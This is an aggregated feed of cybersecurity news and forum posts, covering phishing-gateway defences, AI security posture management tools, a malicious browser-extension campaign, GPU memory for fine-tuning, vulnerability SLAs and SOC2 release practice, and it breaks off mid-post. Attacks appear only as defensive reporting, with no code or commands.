      "summary": "We\u2019re seeing a wave of phishing mails that all look roughly like the screenshot below: Branded as \u201cCitrix Document Signature\u201d (sometimes DocuSign / AdobeSign / generic \u201csecure document service\u201d) Subject like: Payment_ID# Text: \u201cYou have received a secure document that requires your review and signature. File: updated_payment_schedule2025.pdf. To view and complete this document, please click the button below: View Secure Document. This link will only be active for a limited time\u2026\u201d One big \u201cView Secure Document\u201d button that goes to a malicious site (usually today from compromised trusted sender). This is hitting a financial org (micro-credit institution), so the social engineering angle (\u201cupdated payment schedule\u201d, signature required, time-limited link) works really well. We do have an e-mail gateway in front of M365 (with URL rewriting / time-of-click checks enabled) but these keep slipping through. The link destination is not known-bad at delivery time, and apparently still not flagged at click time either. SPF/DKIM/DMARC on the envelope sender look okay enough to pass most checks. What I\u2019m trying to figure out is: Is there any gateway solution that is actually good at catching this specific pattern? I\u2019m thinking of things like better time-of-click checks, reputation on newly registered domains, brand-impersonation detection (Citrix/DocuSign/etc.), language heuristics around \u201csecure document / payment schedule / limited time link\u201d, etc. Can this type of attack be detonated in sandbox??? If you\u2019ve had good experiences with a particular product (Proofpoint, Mimecast, Abnormal, Cisco ESA, FortiMail, whatever) for this exact type of campaign , I\u2019d love to hear which one and what features/config made the difference. Are there any smart gateway-level tricks you\u2019re using? For example: Rules that treat \u201csecure document / e-signature\u201d templates as high risk unless the sending domain is in an allow-list of real providers you use Aggressive blocking/quarantine of links to newly registered domains or domains with no history Custom content rules around phrases + buttons like \u201cView Secure Document\u201d combined with \u201cPayment / Invoice / Schedule\u201d in the subject Or is the honest answer here:\u201cThere\u2019s no magic box. Use a decent gateway, crank the policies up, accept more stuff in quarantine, and put most of your energy into user training and reporting buttons in Outlook.\u201d We\u2019re already planning to: Re-review all email-security policies on the gateway Enable / enforce a report-phish button in Outlook and tune the workflow behind it Do another round of user awareness specifically around \u201csecure document / updated payment schedule\u201d lures But before I start pushing for a change of product or a big config overhaul, I\u2019d like to know if anyone has actually seen a gateway + config that consistently nails this pattern of attack, or if this is just the current reality and education is the main defense. Any real-world experiences (good or bad) are appreciated. submitted by /u/imadam71 [link] [comments]",

Was looking into the Falcon for IT module and from my understanding, if I already have the exposure management module in CS, I should be able to use the Falcon for IT module as well as they seem to go hand in hand especially now? I was watching some videos on it and I think I get the high level overview and the main goal of it which I think addresses some relevant problems, but I couldn't find too much more in terms of specifics. From my understanding, the Falcon for IT module seems like it has been around for maybe a year or so for basic remediation purposes, but in September of this year with the new features, there's now a new focus on incorporating vulnerability prioritization to remediate more priority vulnerabilities quicker. Was curious what this would look like in terms of first identifying priority vulnerabilities, and then using it to patch? Like what are the capabilities of how much it can patch by itself? What about using it with things like SCCM? Can it replace any patching tools entirely yet? Any more info is greatly appreciated :) submitted by /u/swifty_Iemons5812 [link] [comments]",

      "summary": "Tools, die die KI-Infrastruktur unter die Lupe nehmen, optimieren und absichern, liegen im Trend. Unser Ratgeber f\u00fchrt Sie zur richtigen AI-Security-Posture-Management-L\u00f6sung. Julien Tromeur | shutterstock.com Weil sich Generative-AI-L\u00f6sungen branchen\u00fcbergreifend verbreiten, w\u00e4chst das Sicherheitsbed\u00fcrfnis der Anwender. Diesem gerecht zu werden, ist vor allem deshalb eine Challenge, weil die Technologie enormen Einfluss auf die IT-Infrastruktur und die Unternehmensdaten nimmt. Und weil kriminelle Cyberakteure l\u00e4ngst erkannt haben, welches Potenzial f\u00fcr sie in diesem Umstand schlummert. Gefragt sind deshalb neue, breit gef\u00e4cherte Schutz- und Notfallma\u00dfnahmen und Sicherheitssoftware, die spezifisch darauf ausgelegt ist, KI-Infrastrukturen abzusichern . Das hat l\u00e4ngst diverse Cybersecurity-Anbieter dazu bewogen, entsprechende L\u00f6sungen zu entwickeln. Oder bestehende Produkte mit entsprechenden Features anzureichern. Dieses Wachstumssegment des Security-Markts l\u00e4uft auch unter der Bezeichnung \u201cAI Security Posture Management\u201d \u2013 kurz AI-SPM. In diesem Artikel erfahren Sie: was Security-L\u00f6sungen ausmacht, die KI-Infrastrukturen absichern. was AI-SPM-Tools leisten sollten und welche Anbieter und Produkte in diesem Bereich wichtig sind. CSPM, DSPM und AI-SPM AI Security Posture Management fokussiert darauf, die Integrit\u00e4t und Sicherheit von KI- und ML-Systemen zu gew\u00e4hrleisten. Dabei umfasst AI-SPM Strategien, Tools und Techniken, um Daten, Pipelines, Applikationen und Services mit Blick auf ihre Sicherheitslage: zu \u00fcberwachen, zu bewerten und zu optimieren. Bisher wurden Security Posture Management Tools f\u00fcr zwei separate Bereiche entwickelt: Cloud Security Posture Management (CSPM-) Tools sollen den Cloud-Betrieb allgemein absichern, in erster Linie gegen Fehlkonfigurationen und Missbrauch. Data Security Posture Management (DSPM-) Tools sollen vor Datenlecks und Malware-Infektionen sch\u00fctzen. Das Aufkommen von k\u00fcnstlicher Intelligenz (KI) und Large Language Models (LLMs) hat Bedarf f\u00fcr eine dritte Produktkategorie geschaffen, die gemanagte KI-Cloud-Services und ihre SDKs (beispielsweise Hugging Face Transformer oder Azure Open AI) \u00fcberwacht und KI-Modellmissbrauch verhindert \u2013 AI-SPM. Dass das n\u00f6tig war, unterstreichen diverse Research-Erkenntnisse, -Beitr\u00e4ge und weitere Ressourcen: Eine Studie des API-Spezialisten Kong (Download gegen Daten) kommt zu dem Ergebnis, dass eine Mehrheit der Befragten Wege gefunden hat, Beschr\u00e4nkungen mit Blick auf die KI-Nutzung zu umgehen. Ein Viertel muss sich erst gar nicht mit so etwas wie Guidelines herumschlagen. Die Non-Profit-Organisation MITRE stellt mit seiner Adversarial Threat Landscape for Artificial Intelligence Systems (ATLAS) eine umfassende Datenbank mit Angriffstaktiken zur Verf\u00fcgung, die auf \u201cin the wild\u201d-Beobachtungen beruht. Auch das MIT betreibt eine aktive Datenbank , die mehr als 1.600 Risiken in Zusammenhang mit KI-Systemen bereith\u00e4lt. Eine weitere Quelle, um sich mit KI-bezogenen Angriffsmethoden auseinanderzusetzen, bietet das 2023 von OWASP ver\u00f6ffentlichte LLM-Exploit-Ranking (PDF). Die Non-Profit-Organisation hat zudem eine Checkliste f\u00fcr GenAI-Sicherheit ver\u00f6ffentlicht. Sich mit diesen Quellen auseinanderzusetzen, empfiehlt sich, bevor Sie sich f\u00fcr ein Sicherheits-Tool oder -Feature aus dem Bereich AI-SPM entscheiden. Was Security Posture Management f\u00fcr KI leisten sollte Tools im Bereich AI Security Posture Management: bieten im Regelfall agentenlose Konfigurationen, greifen auf Cloud-basierte Modelle zu und belassen Daten auf den vorhandenen Plattformen. Letzteres dient sowohl der Sicherheit als auch dazu, die Verlagerung der damit verbundenen, massiven Datenbest\u00e4nde zu vermeiden. Dar\u00fcber hinaus spielen bei Security-Tools f\u00fcr KI-Infrastrukturen nat\u00fcrlich auch KI-bezogene Funktionen eine Rolle. Zum Beispiel um gro\u00dfe Datenmengen zu klassifizieren, zu tracken und gegen m\u00f6gliche Missbrauchs- und Angriffsversuche abzusichern . Einige Anbieter haben ihre bestehenden CSPM- oder DSPM-L\u00f6sungen um AI-SPM-Features erweitert \u2013 inklusive Compliance-Pr\u00fcfverfahren , Best Practices und Richtlinien, die alle drei Security-Posture-Management-Arten abdecken. Andere offerieren umfassendere L\u00f6sungen, die eine Vielzahl KI-bezogener Sicherheitsma\u00dfnahmen beinhalten. Zum Beispiel, um: KI-Pipelines und Workloads sch\u00fctzen, zu erkennen, wenn KI-Modelle sensible Daten referenzieren, Trainingsdaten auf Manipulationen durch Dritte oder externe Applikationen zu \u00fcberpr\u00fcfen oder KI-Services und -Plattformen abzusichern. Wichtige AI-SPM-Anbieter Im Folgenden haben wir die AI-SPM-Produkte und -Features neun verschiedener Anbieter f\u00fcr Sie zusammengefasst. S\u00e4mtliche L\u00f6sungen versprechen, Ihre KI-Infrastruktur abzusichern, verlassen sich dazu jedoch auf unterschiedliche Ans\u00e4tze. Dabei ist zu beachten, dass es sich um einen Markt handelt, der im Wachstum begriffen ist. Die Produkte sind also noch nicht so umfassend ausgestaltet und integriert, wie sie sein k\u00f6nnten. Zudem arbeiten diverse weitere Sicherheitsanbieter aktiv an \u00e4hnlichen Offerings. Cyera.io ist auf Datenklassifizierung spezialisiert und hat eine DSPM-Plattform im Angebot, die um AI-SPM-Features erweitert wird. Die L\u00f6sung verspricht beispielsweise Einblicke, auf welche Datenklassen und Data Stores Microsoft-Copilot-Nutzer zugreifen k\u00f6nnen. LegitSecurity hat sich auf die Fahnen geschrieben, das \u201cAI Visibility Gap\u201d schlie\u00dfen zu wollen. Dazu untersucht die AI-SPM-Plattform KI-Modelle, Code Repositories, kryptografische Secrets und andere KI-bezogene Instanzen. Auf dieser Grundlage entstehen schlie\u00dflich Risk Scores, um entsprechend priorisieren zu k\u00f6nnen. Mit dieser L\u00f6sung k\u00f6nnen Sie beispielsweise nachvollziehen, welche User Github Copilot auf der Basis von unsicheren KI-Modellen verwenden. Microsoft stellt AI-Security-Posture-Management-Funktionen im Rahmen einer Preview f\u00fcr sein CSPM-Angebot zur Verf\u00fcgung. Das fertige Produkt soll Ende 2024 zur Verf\u00fcgung stehen und zum Einsatz kommen, um GenAI-Applikationen in Multi- oder Hybrid-Cloud-Szenarien abzusichern. Dazu wird zum Beispiel eine GenAI-Softwarest\u00fcckliste (AI BOM) erfasst. Orca Security verspricht mit seiner Mehrzweck-Sicherheitsplattform unter anderem eine \u201cEnde-zu-Ende\u201d-AI-SPM-L\u00f6sung. Diese scannt unter anderem mehr als 50 verschiedene KI-Modellquellen und schl\u00e4gt Alarm, wenn sie dort \u2013 oder in Trainingsdaten-Repositories \u2013 sensible Informationen oder Geheimnisse entdeckt. Palo Alto Networks hat Ende 2023 die \u00dcbernahme des DSPM-Spezialisten Dig Security abgeschlossen und diesen inzwischen vollst\u00e4ndig integriert. Das Ergebnis hei\u00dft Prisma Cloud AI-SPM und erm\u00f6glicht zum Beispiel Top-Level-Scans der KI-Services von AWS, Google Cloud und Azure. Zudem hat der Sicherheitsanbieter MItte 2025 auch den KI-Sicherheitsanbieter Protect AI \u00fcbernommen . Securiti.ai verspricht mit seinem Produkt \u201cAI Security & Governance\u201d Schutz f\u00fcr KI-Instanzen. Dieses erm\u00f6glicht zum Beispiel KI-Modellrisiken zu bewerten und zu klassifizieren, Compliance-Pr\u00fcfungen vorzunehmen oder Kontrollma\u00dfnahmen f\u00fcr Daten und KI-Systeme zu etablieren. Varonis hat seine Sicherheitsplattform ebenfalls um \u201cAI Security\u201d erweitert. Das erm\u00f6glicht unter anderem, risikobehaftete KI-Fehlkonfigurationen zu erkennen und zu beheben, KI-generierte Inhalte mit Sensibilit\u00e4ts-Labels zu versehen sowie KI-Workloads oder Datenfl\u00fcsse zu erkennen, die sensible Informationen beinhalten. F\u00fcr Microsoft Copilot steht ein eigenes (aufpreispflichtiges) Modul zur Verf\u00fcgung \u2013 demn\u00e4chst sollen weitere f\u00fcr Salesforce Einstein und Google Gemini folgen. Wiz Security verf\u00fcgt \u00fcber einschl\u00e4gige DSPM- und CSPM-Erfahrungswerte und hat auch eine dedizierte KI-SPM-L\u00f6sung im Angebot. Diese verspricht zum Beispiel umfassende Einblicke in KI-Pipelines sowie Detektions-M\u00f6glichkeiten f\u00fcr Angriffspfade oder Fehlkonfigurationen.

GSCCCA had to take every public-facing system offline for nearly a week, shutting down access to statewide land records, notary services and e-filing tools while the Devman group claimed hundreds of gigabytes of stolen data. Even by the authority\u2019s own account, they stopped encryption in progress but cannot yet rule out data exfiltration.

      "title": "Risk Managers: Vulnerability SLAs and SLA Exception tracking questions",
      "summary": "Context : It is common for asset vulnerabilities from third parties reported as CVEs to have No Fix Available until well past our remediation SLA, especially in the case of Critical and High severities. We track all detected vulnerabilities through their lifecycles and report regularly (quarterly) on our remediation SLA rates as one of our Security Objectives KPIs. We are a very small company, and SOC overhead can sometimes be a challenge to our various engineering and DevOps teams. \"Get to the point already!\" I am wondering what processes you have in place or have experienced for Vulnerability SLA Exceptions, especially if you are in a SMB. We are developing our policy and procedures for creating, approving and monitoring SLA Exception requests. I have seen it suggested that a full Risk Review be performed, including identifying likelihood, impact, and compensating controls (many of which are simply in place by default as a result of our commitment to secure engineering principles). How much effort do you put into the SLA Exception process? A full risk review every time a new CVE comes up can be laborious for a small group. When do you do the SLA Exception, after the SLA has expired, or a couple of days before (making an assumption that the patch won't be available)? It seems that due to the extra overhead of performing a full risk review for a CVE (as it applies to SLA Exceptions) would be best done only if the SLA is sure to be missed. I suppose a case SHOULD be made that a risk review be done for every detected Vulnerability, regardless of whether the SLA will be missed? However, for a small (nay, tiny) company practicality must be a consideration. We automate initial triage and prioritize accordingly and address all fixable vulnerabilities immediately. What strategies can be used to effectively manage risk while not overburdening a small staff with frequent risk reviews? Is this a sensible approach? Critical/High vulnerabilities \u2192 Full risk assessment. Medium/Low vulnerabilities \u2192 Automated scoring + periodic sampling for manual review. Yeah...I slipped the scope of my original question a bit. I appreciate any thoughts or insights you can provide. submitted by /u/jeleyman [link] [comments]",

Not with brute force, but through balance, geometry, feedback loops, and resonance. Molecules don\u2019t hold together by \u201cprocessing power.\u201d Ecosystems don\u2019t stay balanced through firewalls. They stabilize because their structure teaches them how to remain coherent even when stress builds up. I began wondering if technology could learn a similar principle. What if digital systems (cybersecurity, networks, devices, etc.) could balance their own entropy before it becomes chaos? That question eventually became a personal project. And this month, that project officially became patent-pending under the name BeeStable. I\u2019m not here to advertise anything \u2014 I\u2019m just really curious what people think about the idea of stability-driven technology.

We have an employee who used to be the biggest target of spam & phishing in the company, and who left to join another firm only to return again recently. Given the problems his original email address dealt with (which was never deactivated for client reasons), when he rejoined I set him up with a BRAND NEW address, although I did configure his old address to forward all mail to the new one for a few weeks before ultimately decommissioning it (only mentioning in case it's relevant). His old email address, which dated back a decade, appeared in double digit data breaches on haveibeenpwned.com, which was never a surprise, but his new address, which is less than 3 months old and never before used, nonetheless shows as having appeared in 3 data breaches (2024/2023/2018)??? Furthermore, strictly speaking in terms of looking for \"through-lines\", two of the three aren't part of the same data breaches the old original email address and are unique to this new one, AND none of them are companies or services he has EVER used. What is happening here? I feel like I'm having a \"woosh\" moment. Is this indicative of anything? Can it simply be explained by the temporary email forwarding?

I am using the Log Activity area but: The search interface seems to have endless options, in fact the availabile columns total well over 400 options. The filtering on the same screen has 544 filter options This isn't intuitive either as sometimes I am selecting an option which I think relates to a simple IP range or something, and the options provided just aren't clear You then have options to Group By which I understand but the time to search, then to find it's just not presented well or the sheer range of columns mean you're not seeing important data makes it hard. I am trying to use AQL and honestly, at this point using AI to try to figure out as I am on some deadlines with this. There are saved searches and some reports that I have used as a basis, but they references lots of things like internal lists. Like, where RemoteIP != LIST123 or LogSourceID = 8378.

      "title": "Decoding high-bandwidth memory: A practical guide to GPU memory for fine-tuning AI models",
      "summary": "We've all been there. You've meticulously prepared your dataset and written your training script. You hit run , and your excitement builds, only to be crushed by the infamous error: CUDA out of memory. This is one of the most common roadblocks in AI development. Your GPU's High Bandwidth Memory (HBM) , is the high-speed memory that holds everything that's needed for computation, and running out of it is a hard stop. But how do you know how much you need? To build a clear foundation, we'll start by breaking down the HBM consumers on a single GPU and we'll present key strategies to reduce HBM consumption on a single GPU. Later, we'll explore advanced multi-GPU strategies like data and model parallelism that can help relieve memory pressure and scale your training in the cloud. Understanding HBM: What's using all the memory? When you fine-tune a model , your HBM is primarily consumed by three things: Model Weights : This is the most straightforward. It's the storage space required for the model's parameters\u2014the \"brain\" that it uses to make predictions. A 7-billion parameter model loaded in 16-bit precision will take up roughly 14 GB before you even process a single piece of data. Optimizer States and Gradients : This is the overhead that's required for learning. To update the model's weights, the training process needs to calculate gradients (the direction of learning) and the optimizer (like the popular AdamW ) needs to store its own data to guide the training. In full fine-tuning, this can be the largest consumer of HBM. Activations and Batch Data : This is the most dynamic part. When your data (images, text, etc.) flows through the model's layers, the intermediate calculations, or activations , are stored in HBM. The memory needed here is directly proportional to your batch size. A larger batch size means more activations are stored simultaneously, which leads to faster training but much higher memory usage. Note : These calculations are theoretical minimums. Real-world frameworks add up to 30% overhead due to temporary buffers, kernel launches, and memory fragmentation . Although it's impossible to get a perfect number without experimentation, you can estimate your HBM needs with this general formula: Total HBM \u2248 (Model Size) + (Optimizer States) + (Gradients) + (Activations) Further reading : See this excellent JAX e-book that covers these topics in great detail and even has some \"try it out yourself\" test questions . Example: Why full fine-tuning is so demanding To see why running out of memory is such a common problem, let's walk through a real-world example that I recently worked on: fine-tuning the medgemma-4b-it model , which has 4 billion parameters. Our script loads it in bfloat16 precision (2 bytes per parameter). First, let's calculate the static HBM footprint. This is the memory that's required just to load the model and prepare it for training, before you've even processed a single piece of data. Model Size : The memory that's needed to simply hold the model on the GPU. 4 billion parameters \u00d7 2 bytes/parameter = 8 GB Gradients and Optimizer States : The overhead for training every parameter with the AdamW optimizer. Gradients: 4 billion parameters \u00d7 2 bytes/parameter = 8 GB Optimizer States (AdamW): 2 \u00d7 4 billion parameters \u00d7 2 bytes/parameter = 16 GB Note : While AdamW is a popular optimizer, other optimizers, such as Adafactor and Lion, have different memory footprints. Adding these together gives us our baseline HBM cost for a full fine-tuning attempt: 8 GB (Model) + 8 GB (Gradients) + 16 GB (Optimizer) = 32 GB This 32 GB is the baseline just to start the training process. On top of this, the GPU needs additional memory for activations , which is a dynamic cost that grows with your batch size and input data size. This is why full fine-tuning of large models is so demanding and often reserved for the most powerful hardware. Key strategies to reduce HBM consumption The HBM requirement for a full fine-tune can seem impossibly high. But several powerful techniques can reduce memory consumption, making it feasible to train large models on consumer-grade or entry-level professional GPUs. Parameter-Efficient Fine-Tuning (PEFT) with LoRA Instead of training all the billions of parameters in a model, Parameter-Efficient Fine-Tuning (PEFT) methods focus on training only a small subset of parameters. The most popular of these is LoRA (Low-Rank Adaptation) . LoRA works by freezing the original model's weights and injecting a tiny number of new, trainable adapter layers into the model architecture. This means the memory-hungry gradients and optimizer states are only needed for these few million new parameters, not the full 4 billion. The math behind LoRA's memory savings LoRA doesn't remove the base model from your GPU. The full 8 GB of the original model's weights are still loaded and taking up HBM. They're just frozen, which means that the GPU isn't training them. All of the memory savings come from the fact that you no longer need to store the huge gradients and optimizer states for that massive, frozen part of the model. Let's recalculate the static HBM footprint with LoRA, assuming it adds 20 million trainable parameters: Model Size (unchanged) : The base model is still loaded. 4 billion parameters \u00d7 2 bytes/parameter = 8 GB LoRA Gradients & Optimizer States : We now only need overhead for the tiny set of new parameters. Gradients: 20 million parameters \u00d7 2 bytes/parameter = 40 MB Optimizer States: 2 \u00d7 20 million parameters \u00d7 2 bytes/parameter = 80 MB The new static HBM footprint is now: 8 GB (Model) + 40 MB (Gradients) + 80 MB (Optimizer) \u2248 8.12 GB The training overhead has shrunk from 24 GB to just 120 MB. Your new baseline memory requirement is now just over 8 GB. This lower baseline memory requirement leaves much more room for the dynamic memory that's needed for activations, which lets you use a reasonable batch size on a common 16 GB or 24 GB GPU without running out of memory. Model quantization Besides training fewer parameters, we can also shrink the ones that we have by using quantization , which involves reducing the numerical precision of the model's weights. T he standard precision for modern training is bfloat16 because it offers the dynamic range of float32 with half the memory footprint. But we can reduce HBM usage further by converting weights to lower-precision integer formats like int8 or int4. Using lower-precision integer formats has a significant impact on HBM when compared to the standard bfloat16 baseline: bfloat16 (standard): The baseline size (e.g., a 7B model requires ~14 GB ). 8-bit precision: Halves the model size (e.g., 14 GB becomes ~7 GB ). 4-bit precision: Reduces the model size by a factor of 4 (e.g., 14 GB becomes ~3.5 GB ). The reduction in size lets you fit much larger models into memory with minimal degradation in performance. aside_block ), ('btn_text', ''), ('href', ''), ('image', None)])]> Combining LoRA and Quantization : These techniques work best together. Quantized LoRA ( QLoRA) is a method that stores the massive base model in a highly efficient 4-bit format (specifically NF4 or NormalFloat 4), while adding small, trainable LoRA adapters in bfloat16. During the training process, the 4-bit weights are dequantized to bfloat16 for computation. Dequantizing in process lets you fine-tune very large models on a single GPU with the memory savings of 4-bit storage and the mathematical stability of 16-bit training. FlashAttention: An algorithmic speed boost Finally, FlashAttention is a foundational algorithmic optimization that significantly reduces HBM usage and speeds up training on both single and multi-GPU setups. The attention mechanism in transformers is a primary memory bottleneck because it requires storing a large, intermediate attention matrix . FlashAttention cleverly reorders the computation to avoid storing this full matrix in memory, leading to substantial memory savings and faster execution. Best of all, enabling FlashAttention is often as simple as a one-line change. In the MedGemma fine-tuning script , this was done by setting the value attn_implementation=\"sdpa\" , which can automatically use more efficient backends like FlashAttention if the hardware supports it. Scaling beyond a single GPU: Advanced strategies Techniques like LoRA and quantization are useful for lowering HBM needs on a single GPU. But to train truly massive models or to really speed up the process, you'll eventually need to scale out to multiple GPUs. Here are some of the key strategies that can be used to distribute the load and overcome memory limitations. Data parallelism Data parallelism is the most common and intuitive approach to scaling. In a Distributed Data Parallel (DDP) setup, the entire model is replicated on each GPU. The key is that the global batch of training data is split, with each GPU processing its own mini-batch concurrently. After each forward and backward pass, the gradients from each GPU are averaged together to ensure that all of the model replicas learn from the entire dataset and they stay in sync. This method is excellent for speeding up training but it doesn't reduce the HBM that's required to hold the model itself, because every GPU needs a full copy. Model parallelism When a model is too large to fit into the memory of a single GPU, you must use model parallelism . Instead of replicating the model, this strategy splits the model across multiple GPUs. There are two primary ways to do this: Tensor parallelism : This method splits a single large operation (like a massive weight matrix in a transformer layer) across several GPUs. Each GPU computes its part of the operation, and the results are combined. Pipeline parallelism : This technique places different layers of the model onto different GPUs in a sequence. The data flows through the first set of layers on GPU 1, then the output is passed to GPU 2 for the next set of layers, and so on, like an assembly line. These strategies are more complex to implement than data parallelism, but they're essential for models that are simply too big for one device. Fully Sharded Data Parallelism (FSDP) FSDP is a powerful and efficient hybrid strategy that combines the ideas of data parallelism and model parallelism. Unlike standard data parallelism where each GPU holds a full copy of the model, optimizer states, and gradients, FSDP shards (or splits) all of these components across the GPUs. Each GPU only materializes the full parameters for the specific layer that it's computing at that moment, dramatically reducing the peak HBM usage per device. FSDP makes it possible to train enormous models on a cluster of smaller GPUs. By combining these hardware and software strategies, you can scale your fine-tuning jobs from a single GPU to a powerful, distributed cluster capable of handling even the most demanding AI models. HBM sizing guide HBM Use case and explanation 16 GB Sufficient for basic inference or fine-tuning with techniques like LoRA using a very small batch size (e.g., 1-2). Expect slower training times at this level. 24 GB The recommended starting point for a good experience with 4-7 B parameter models. This capacity allows for a more effective batch size (e.g., 8-16) when using LoRA, providing a great balance of training speed and cost. 40+ GB Necessary for maximizing training speed with large batch sizes or for working with larger models (in the 20+ B parameter range) now or in the future. Encountering the CUDA out of memory error provides an important lesson in the trade-offs between model size, training techniques, and batch size. By understanding what consumes your HBM, you can make smarter decisions and keep your projects running smoothly.

I usually work on SOC related topics. Recently, I was staffed on a big project around DNS advisory for a major client (out of the team\u2019s scope). When I arrived, the project had already started with a senior who is also new to DNS, there was little onboarding and very tight deadlines. Long story short, I crashed.

I\u2019m now recovering and I clearly see that this rhythm + type of pressure is not sustainable for me. I\u2019m honestly thinking of leaving consulting and going to something more \u201cclassic\u201d to protect my health and get solid hands-on experience in a SOC.

      "title": "Is GRC too competitive for my background to pivot?",
      "summary": "I am a technical writer in cybersecurity and graduated in 2022. Since then, I've worked at two of the leading identity security companies and will soon be acquired by a Fortune 500 cybersecurity company. Tech writing is very threatened by AI. Thankfully, I am more of a doc engineer right now, where I write in a docs-as-code environment, I'm good at Git and CI/CD pipelines, and I leverage AI in meaningful ways in my career. Tech writing hits a ceiling very quickly, and the remote job market to make a decent salary is hyper competitive. I'm planning to move to GRC for better growth opportunities, higher salary prospects, job security, and impactful work. The bulk of my job is communicating with different stakeholders in the company, gathering technical info, and translating it into user-friendly docs. I love the communication, detective work, and docs that my job has, and I want to apply this in GRC by impacting security posture and not just end users. Here are my resume points so far: \u25cf Collaborate with security engineers, product managers, and developers via Jira to gather technical information and distill it for user-friendly certificate lifecycle management documentation. \u25cf Author and maintain cloud-based documentation in a Docs-as-Code environment using Markdown and Git Bash CLI, integrated with CI/CD pipelines to ensure version control, scalability, and fast iteration. \u25cf Automate document linting with Python scripts to detect style deviations, broken links, and test code snippets to streamline the editorial process and ensure documentation stays up to date. \u25cf Build tailored AI agents for style checking, UX writing, and persona-based usability testing simulations. \u25cf Lead quarterly content audits informed by user testing and internal feedback, restructuring documentation for improved navigation, clarity, and user confidence. \u25cf Wrote installation guides, online help, developer guides, and release notes for IAM cloud software with MadCap Flare and Adobe FrameMaker. \u25cf Led department meetings to improve SME communication strategies and tooling innovations. \u25cf Documented SOAP and REST API reference guides to simplify API handling for developer audiences. \u25cf Directed usability testing with 30 internal users, presenting findings to engineering, product, and sales directors to drive UX improvements and secure funding for future research. \u25cf Managed department knowledge base content to simplify processes and efficiently teach writers. \u25cf Conducted risk gap analysis on third-party AI tools against NIST AI RMF and NIST 800-53 to validate vendor compliance. \u25cf Executed Data Loss Prevention (DLP) audits on documentation, redacting sensitive data to prevent information leakage and ensure legal compliance. I've had zero luck getting interviews, but I've had some cold messages lead to a few close calls. I really want to pursue the GRC engineering side of the career, as my current tech writing/DevOps familiarity has some similarities. I really want to lean into the AI governance and risk category as well because I could see AI security issues and compliance exploding as enterprises are now adopting these tools. Do I have a chance? Does the market need to heat up again first? Would love your advice. submitted by /u/buzzlightyear0473 [link] [comments]",

      "title": "Newly discovered malicious extensions could be lurking in enterprise browsers",
      "summary": "A sprawling surveillance campaign targeting Google Chrome and Microsoft Edge users is just the latest evolution of a seven-year-long project to distribute malicious browser extensions. By targeting trusted browser extensions and weaponizing them only after they had passed initial acceptance checks and gained a broad following, sometimes over years, a group that Koi has labelled \u201cShadyPanda\u201d has infected 4.3 million browser instances to harvest browsing data, hijack search results, manipulate traffic, and deploy a backdoor capable of remote code execution. The risk for enterprises is significant if any of those browsers are on work PCs or on employees\u2019 own devices used to access work resources, Koi warned. \u201cInfected developer workstations mean compromised repositories and stolen API keys,\u201d security researcher Tuval Admoni said in a post on the Koi Security blog . \u201cBrowser-based authentication to SaaS platforms, cloud consoles, and internal tools means every login is visible to ShadyPanda.\u201d The malicious extensions are no longer being distributed, but organizations with infected machines remain at risk: \u201cEven though the extensions were recently removed from marketplaces, the infrastructure for full scale attacks remains deployed on all infected browsers,\u201d Admoni said. Multi-year campaign with shifting motives Koi\u2019s analysis shows that ShadyPanda maintained a multi-year, multi-generational infrastructure of browser extensions dating back to 2017. The group cycled through dozens of extensions, with 20 published to the Chrome Web Store and 125 distributed for Edge. The earliest extensions focused on affiliate fraud, extracting hidden commissions on victims\u2019 online purchases, later shifting to search-result manipulation. Most recently, they have included sophisticated behavioral tracking, session-data harvesting, and browser fingerprinting surveillance affecting 4 million users, and a backdoor supporting remote code execution (RCE) affecting 300,000. ShadyPanda played the long game, with extensions including the popular Clean Master utility with 200,000 installs distributed as completely legitimate tools early on, earning them positive user ratings and, in some cases, trust signals such as \u201cFeatured\u201d or \u201cVerified\u201d badges in the Chrome Web Store and Microsoft Edge Add-ons store. No review after submission This long-term legitimacy built a large user base and may have normalized these extensions inside enterprises, where browser add-ons often pass through with little scrutiny. Only after accumulating trust, and millions of installs, did ShadyPanda push silent malicious updates. It embedded hidden install-tracking routines that mapped user behavior and optimized reach before weaponizing it through a malicious update. Because Chrome and Edge updates occur automatically and do not require user re-approval for existing permissions, the exploit happened quietly. \u201cShadyPanda\u2019s success is about systematically exploiting the same vulnerability for seven years: Marketplaces review extensions at submission,\u201d Admoni said. \u201cThey don\u2019t watch what happens after approval.\u201d Evasion and Man-in-the-Browser tricks ShadyPanda also invested in staying hidden. Koi found that when developer tools were opened, the malicious logic immediately switched to benign behavior, making manual analysis harder. Obfuscation and controlled activation further obscured the malicious component, ensuring stealth. Koi noted that some of these extensions were still live in the Edge Add-ons store at the time of disclosure. Clean Master\u2019s publisher, Starlab Technology, launched 5 additional extensions on Microsoft Edge around 2023, picking up over 4 million combined installs. \u201cAll 5 extensions are still live in Microsoft Edge marketplace,\u201d Admoni said, adding that two of those are comprehensive spyware. Google recently removed Clean Master from the Chrome Web Store, and today none of the extensions are available on Chrome Web Store, a Google spokesman said. Microsoft did not immediately respond to CSO\u2019s request for comment. Like in a man-in-the-middle ( MitM ) style attack, ShadyPanda effectively positioned itself between users and the websites they visited, inserting tracking logic into pages they loaded. This allowed the attackers to observe and manipulate traffic through the browser, giving the actor continuous visibility into how infected users interacted with the web. Admoni pointed out that removing the extensions might not help as, presumably, the attackers may already have collected high-value data including cookies, browsing patterns, session tokens, fingerprinting data, etc. In its blog post, Koi provided a list of malicious Chrome and Edge extensions, along with C2 and data exfiltration domains to support detection efforts.",

      "title": "Is my release process SOC2 compliant?",
      "summary": "Hi, I work as a software developer for a small start-up that's looking to do SOC2. The bulk of our SOC2 stuff is going to be done by the IT admin I work with, but as I understand it, the auditors will also look at how our software product is actually released to production. That's my area of responsibility. I want to check with the crowd if our release process is compliant with SOC2. Here is how we do releases to prod now: - Our software product is an application that lives in its own \"application\" repo on GitHub. It has a protected \"main\" branch that requires all new merges to go through a manual peer review process, accompanied by a battery of automated tests. Nothing gets merged into main until it's approved and passed all tests. - Every time there is a new commit on main, we automatically build a docker image and push it to a AWS ECR. - For managing infra and actual deployments, we have a separate repo called \"infra\". This holds all the Terraform stuff, as well as some Python scripts for deploying new revisions of the application image. The script is literally `python deploy.py -- env [staging | prod] --application-image-id [image_tag]`. - All developers on my small team have access to the infra repo & the deploy script. Once the product manager decides it's time to release, one of the developers picks the correct image from the ECR, and updates prod with it (we use AWS ECS for container orchestration). - The deploy script is wrapped in a GitHub Action. So the workflow is \"pick image -> go to infra repo -> manually dispatch deployment GitHub action with new image sha\". The approval for release is not really documented anywhere, and any logging that happens here is whatever AWS cloud trail generates when our deploy script calls AWS SDK. --- I think the continuous integration of our setup is solid. We maintain a library of releasable images in ECR, and I can point the auditor to the thousands of reviewed and 